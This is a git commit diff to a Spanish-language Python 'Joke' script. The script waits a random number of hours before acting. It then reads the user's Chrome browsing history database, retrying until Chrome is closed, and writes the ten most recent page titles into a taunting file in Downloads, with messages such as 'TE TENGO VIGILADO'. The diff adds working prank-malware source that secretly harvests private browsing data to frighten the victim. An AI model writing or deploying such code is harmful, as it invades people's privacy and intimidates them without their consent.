a88a57ce7503f87fb5e793fd7fa93d54121c5255
Josele Coca <josealx0211@gmail.com>
2024-07-17 18:02:36 +0200

    Sacar ultimas 10 visitas en historial
    Se han recorrido las últimas  10 paginas visitas en el historial de google y se pone en el txt donde queremos poner al usuairo

--- DATOS_CONTROL/Joke/Main.py
+++ DATOS_CONTROL/Joke/Main.py
@@ -1,4 +1,5 @@
 import os
+from pathlib import Path
 from time import sleep
 from random import randrange
 import sqlite3
@@ -16,6 +17,10 @@ def delay_action():
     sleep(x_hours)
 
 
+def get_user_path():
+
+    return "{}/".format(Path.home())
+
 def generate_txt_message(user_path):
     # Crear archivo
     # a = open(desktop_path + "Para Ti.txt", "w")
@@ -27,37 +32,48 @@ def generate_txt_message(user_path):
     # with open(user_path + "Downloads\\" + HACKER_FILE, "w") as hackerFile:
     #     hackerFile.write("H9LA SOY EL HACKER DE TIIII")
 
-    hacker_file = open(user_path + "Downloads\\" + HACKER_FILE, "w")
+    hacker_file = open(user_path + "Downloads/" + HACKER_FILE, "w")
+    hacker_file.writelines("SOY UN DESGRACIADO PERO TE TENGO VIGILADO\n")
     return hacker_file
 def get_chrome_history(user_path):
-    try:
-        # RUTA A LA BD EN HISTOY DE GOOGLE
-        db_history = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
 
-        # CREAR UNA CONECTION CON LA RUTA Y ESTAR DENTRO PARA PODER REALIZAR CUALQUIER COSA CON ELLA
-        connection = sqlite3.connect(db_history)
+#HACER QUE SE EJECUTE HASTA QUE EL GOOGLE SE CIERRE
+    ursl = None
 
-        # APUNTAR A LA BD
-        cursor = connection.cursor()
+    while not ursl:
+        try:
+            # RUTA A LA BD EN HISTOY DE GOOGLE
+            db_history = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
 
-        # REALIZAR SENTENCIA SQL para ver los datos que nos gustaría
-        cursor.execute("SELECT title, last_visit_time from urls ORDER BY  last_visit_time DESC")
+            # CREAR UNA CONECTION CON LA RUTA Y ESTAR DENTRO PARA PODER REALIZAR CUALQUIER COSA CON ELLA
+            connection = sqlite3.connect(db_history)
 
-        # Recoge todos los datos
-        urls = cursor.fetchall()
+            # APUNTAR A LA BD
+            cursor = connection.cursor()
 
-        # MOSTRARMOS POR CONSOLA LA RESPUESTA A LA BD
-        print(urls)
+            # REALIZAR SENTENCIA SQL para ver los datos que nos gustaría
+            cursor.execute("SELECT title, last_visit_time from urls ORDER BY  last_visit_time DESC")
 
-        # Cerrar conexion
-        connection.close()
+            # Recoge todos los datos
+            urls = cursor.fetchall()
 
-        return urls
+            # MOSTRARMOS POR CONSOLA LA RESPUESTA A LA BD
+            # print(urls)
 
-    except sqlite3.OperationalError:
-        print("NO se pudo continuar porque la base de datos esta abierta")
-        return None
+            # Cerrar conexion
+            connection.close()
 
+            return urls
+
+        except sqlite3.OperationalError:
+            print("NO se pudo continuar porque la base de datos esta abierta, Lo intententamos de nuevo ...")
+            sleep(2)
+
+
+def check_history_write(hacker_file, chrome_history):
+
+    for item in chrome_history[:10]:
+        hacker_file.write("He visto que has visitado la web : {} , interesante \n".format(item[0]))
 
 def main():
 
@@ -65,7 +81,8 @@ def main():
     delay_action()
 
     #CALCULAR LA RUTA DEL USUARIO
-    user_path = "C:\\Users\\alexc\\"  #TAREA SABER SI LA RUTA ES LA DE USUARIO
+    user_path = get_user_path()
+    # user_path = "C:\\Users\\alexc\\"  #TAREA SABER SI LA RUTA ES LA DE USUARIO
     # desktop_path = user_path + "Downloads\\"
 
     #CREAMOS EL ARCHIVO
@@ -74,6 +91,8 @@ def main():
     #RECOGEMOS EL HISTORIAL DEL USUARIO DE GOOGLE
     chrome_history = get_chrome_history(user_path)
 
+    #Escribiendo message de terror
+    check_history_write(hacker_file, chrome_history)
 
     #Obtener nombre del user
     # print(os.getlogin())
@@ -84,3 +103,5 @@ if __name__ == '__main__':
 
 #ANOTACIONES
         #NO SE PUEDE EJECUTAR SI EL GOOGLE CHROME ESTA ABIERTO NECESITA ESTAR CERRADO
+
+
